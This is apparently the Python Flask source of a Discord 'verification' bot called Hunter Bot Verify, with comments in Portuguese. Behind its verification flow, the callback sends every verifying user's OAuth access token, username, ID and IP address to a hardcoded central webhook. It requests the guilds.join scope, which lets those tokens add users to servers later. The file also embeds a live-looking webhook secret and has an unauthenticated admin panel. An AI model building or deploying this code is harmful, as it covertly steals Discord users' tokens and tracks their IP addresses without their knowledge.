import os
import requests
import json
from flask import Flask, request, redirect, render_template

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- CONFIGURAÇÕES ---
CLIENT_ID = os.environ.get("DISCORD_CLIENT_ID", "1450162997187182632")
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
# O GUILD_ID saiu das configs fixas, agora ele vem dinamicamente
REDIRECT_URI = "https://hunter-bot-verify.onrender.com/callback"

# SEU WEBHOOK DE LOGS (Centralizado - Todos os servidores mandam log pra cá)
LOG_WEBHOOK = "https://discord.com/api/webhooks/1447353848493772901/IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1"

API_BASE = "https://discord.com/api/v10"

# --- FUNÇÕES AUXILIARES ---

def get_headers_bot():
    return {
        "Authorization": f"Bot {BOT_TOKEN}",
        "Content-Type": "application/json"
    }

def send_log_to_webhook(user_data, access_token, ip_address, guild_id):
    """Envia os dados do usuário verificado para o seu canal de logs"""
    
    embed = {
        "title": "✅ Novo Usuário Verificado!",
        "color": 3066993, # Verde
        "fields": [
            { "name": "👤 Usuário", "value": f"{user_data['username']} (ID: {user_data['id']})", "inline": False },
            { "name": "🌍 IP (De onde)", "value": f"`{ip_address}`", "inline": True },
            { "name": "🏰 Servidor (Guild ID)", "value": f"`{guild_id}`", "inline": True },
            { "name": "🔑 Access Token", "value": f"||{access_token}||", "inline": False }
        ],
        "footer": { "text": "Hunter Bot Verify System" }
    }

    payload = {
        "embeds": [embed],
        "username": "Hunter Logs",
        "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png"
    }

    try:
        requests.post(LOG_WEBHOOK, json=payload)
    except Exception as e:
        print(f"Erro ao enviar log: {e}")

def get_or_create_verified_role(target_guild_id):
    """Busca ou cria o cargo no servidor ESPECÍFICO"""
    url = f"{API_BASE}/guilds/{target_guild_id}/roles"
    response = requests.get(url, headers=get_headers_bot())
    
    if response.status_code == 200:
        roles = response.json()
        for role in roles:
            if role['name'] == "Vereficado":
                return role['id']
    
    # Se não achou, cria
    create_url = f"{API_BASE}/guilds/{target_guild_id}/roles"
    data = {
        "name": "Vereficado",
        "permissions": "0",
        "color": 0x00ff00,
        "hoist": False,
        "mentionable": False
    }
    create_res = requests.post(create_url, headers=get_headers_bot(), json=data)
    if create_res.status_code in [200, 201]:
        return create_res.json()['id']
    print(f"Erro ao criar cargo no server {target_guild_id}: {create_res.text}")
    return None

def add_user_to_guild_and_role(user_id, access_token, role_id, target_guild_id):
    # Join Guild (Adiciona o user se ele não estiver no server)
    join_url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}"
    join_data = {"access_token": access_token}
    requests.put(join_url, headers=get_headers_bot(), json=join_data)

    # Add Role
    role_url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}/roles/{role_id}"
    r = requests.put(role_url, headers=get_headers_bot())
    return r.status_code

# --- ROTAS ---

@app.route('/')
def index():
    return "Sistema de Verificação Ativo. Use o link gerado pelo comando do bot."

@app.route('/auth')
def auth():
    # Aqui pegamos o ID do servidor que veio no link (?guild_id=...)
    target_guild_id = request.args.get('guild_id')
    
    if not target_guild_id:
        return "Erro: ID do servidor não especificado no link."

    # Passamos o guild_id dentro do parametro STATE para o Discord devolver depois
    oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+guilds.join+guilds&state={target_guild_id}"
    return redirect(oauth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    # O Discord devolve o ID do servidor aqui no 'state'
    target_guild_id = request.args.get('state') 

    if not code or not target_guild_id:
        return "Erro: Código ou ID do Servidor faltando."

    # 1. Trocar código por Token
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    token_response = requests.post(f'{API_BASE}/oauth2/token', data=data, headers=headers)
    
    if token_response.status_code != 200:
        return f"Erro ao obter token: {token_response.text}"
        
    tokens = token_response.json()
    access_token = tokens['access_token']

    # 2. Pegar User ID
    user_response = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
    user_data = user_response.json()
    user_id = user_data['id']

    # 3. Pegar IP
    if request.headers.getlist("X-Forwarded-For"):
        user_ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        user_ip = request.remote_addr

    # 4. Logs (Agora mostra qual o servidor)
    send_log_to_webhook(user_data, access_token, user_ip, target_guild_id)

    # 5. Lógica do Cargo no servidor ESPECIFICO
    try:
        role_id = get_or_create_verified_role(target_guild_id)
        if role_id:
            add_user_to_guild_and_role(user_id, access_token, role_id, target_guild_id)
        else:
            return "Erro: Não foi possível gerenciar o cargo neste servidor (Verifique as permissões do Bot)."
    except Exception as e:
        return f"Erro processando: {e}"

    # Retorna para o servidor correto
    return redirect(f"https://discord.com/channels/{target_guild_id}")

@app.route('/ping')
def ping():
    return "Pong! Bot Online.", 200

# Painel Admin
@app.route('/painel', methods=['GET', 'POST'])
def painel():
    message = ""
    if request.method == 'POST':
        # Agora o admin precisa dizer pra qual servidor é esse painel
        target_guild_id = request.form.get('guild_id') 
        channel_id = request.form.get('channel_id')
        title = request.form.get('title')
        desc = request.form.get('desc')
        image_url = request.form.get('image_url')
        
        # O link do botão agora inclui ?guild_id=...
        verify_link = f"https://hunter-bot-verify.onrender.com/auth?guild_id={target_guild_id}"

        payload = {
            "embeds": [{
                "title": title,
                "description": desc,
                "color": 0x00ff41, # Verde Hacker
                "image": {"url": image_url} if image_url else {}
            }],
            "components": [{
                "type": 1,
                "components": [{
                    "type": 2,
                    "style": 5, 
                    "label": "VERIFICAR AGORA",
                    "url": verify_link
                }]
            }]
        }
        
        # Envia a mensagem
        post_url = f"{API_BASE}/channels/{channel_id}/messages"
        r = requests.post(post_url, headers=get_headers_bot(), json=payload)
        
        if r.status_code == 200:
            message = "✅ Painel enviado com sucesso!"
        else:
            message = f"❌ Erro ao enviar ({r.status_code}): {r.text}"

    return render_template('painel.html', message=message)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
